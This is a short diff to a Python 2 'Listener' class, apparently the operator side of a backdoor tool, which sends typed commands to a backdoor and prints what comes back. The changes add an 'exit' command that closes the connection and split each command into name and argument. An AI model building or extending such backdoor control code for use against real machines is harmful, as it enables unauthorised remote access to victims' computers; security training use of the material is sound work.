@@ -46,6 +46,9 @@ class Listener:
     def execute_remotely(self, command):
         # we send the command to the backdoor
         self.reliable_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
         # return the received data
         return self.reliable_receive()
 
@@ -53,6 +56,8 @@ class Listener:
         while True:
             # ask the user for a command
             command = raw_input(">> ")
+            # split the command in a list to have the command and the argument seperated
+            command = command.split(" ")
             result = self.execute_remotely(command)
             # print the result
             print(result)
